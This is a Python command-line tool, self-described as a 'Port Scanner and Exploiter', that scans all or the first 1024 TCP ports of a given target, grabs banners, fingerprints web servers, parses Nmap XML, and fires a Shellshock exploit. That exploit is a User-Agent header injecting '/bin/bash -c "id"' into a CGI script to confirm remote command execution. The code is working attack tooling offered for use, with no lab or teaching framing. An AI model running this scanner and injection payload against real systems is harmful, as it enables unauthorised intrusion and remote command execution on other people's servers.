import xml.etree.ElementTree as ET
import socket
import concurrent.futures
import requests
import argparse

def scan_port(target, port):
    try:
        with socket.socket() as sock:
            sock.settimeout(0.5)
            sock.connect((target, port))
            try:
                banner = sock.recv(1024).decode(errors="ignore").strip()
            except:
                banner = "No banner"
            return (port, True, banner)
    except:
        return (port, False, None)

def fingerprint_http(target, port):
    try:
        url = f"http://{target}:{port}"
        r = requests.get(url, timeout=2)
        title = "N/A"
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0]
        return {
            "port": port,
            "status": r.status_code,
            "title": title,
            "headers": dict(r.headers)
        }
    except Exception as e:
        return {"port": port, "error": str(e)}

def exploit_shellshock(target):
    headers = {
        "User-Agent": '() { :; }; echo; echo; /bin/bash -c "id"'
    }
    try:
        r = requests.get(f"http://{target}/cgi-bin/status", headers=headers, timeout=2)
        if "uid=" in r.text:
            return "[+] Shellshock vulnerable!\n" + r.text
        else:
            return "[-] Not vulnerable."
    except Exception as e:
        return f"[-] Error testing Shellshock: {e}"

def parse_nmap_xml(filename="full_scan.xml"):
    print("\n[*] Parsing Nmap XML Output...")
    try:
        tree = ET.parse(filename)
        root = tree.getroot()
        for host in root.findall("host"):
            addr = host.find("address").attrib["addr"]
            ports = host.find("ports")
            for port in ports.findall("port"):
                portid = port.attrib["portid"]
                state = port.find("state").attrib["state"]
                if state == "open":
                    print(f"[+] {addr}:{portid} is open")
    except Exception as e:
        print(f"[-] Error parsing XML: {e}")

def main():
    parser = argparse.ArgumentParser(description="Python Port Scanner and Exploiter")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("--full", action="store_true", help="Scan all 65535 ports")
    parser.add_argument("--nmap", help="Parse Nmap XML output", metavar="XML_FILE")
    args = parser.parse_args()

    target = args.target
    port_range = range(1, 65536) if args.full else range(1, 1025)

    print(f"[*] Starting port scan on {target}...")
    open_ports = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        futures = [executor.submit(scan_port, target, port) for port in port_range]
        for future in concurrent.futures.as_completed(futures):
            port, is_open, banner = future.result()
            if is_open:
                print(f"[+] Port {port} is open - Banner: {banner}")
                open_ports.append((port, banner))

    print("\n[*] Starting HTTP fingerprinting...")
    for port, _ in open_ports:
        if port in [80, 443, 8080, 8000]:
            info = fingerprint_http(target, port)
            if "error" not in info:
                print(f"\n[HTTP {info['port']}] Status: {info['status']}")
                print(f"Title: {info['title']}")
                print("Headers:")
                for k, v in info['headers'].items():
                    print(f"  {k}: {v}")
            else:
                print(f"[-] Port {port} fingerprint error: {info['error']}")

    print("\n[*] Testing for Shellshock...")
    result = exploit_shellshock(target)
    print(result)

    if args.nmap:
        parse_nmap_xml(args.nmap)

if __name__ == "__main__":
    main()
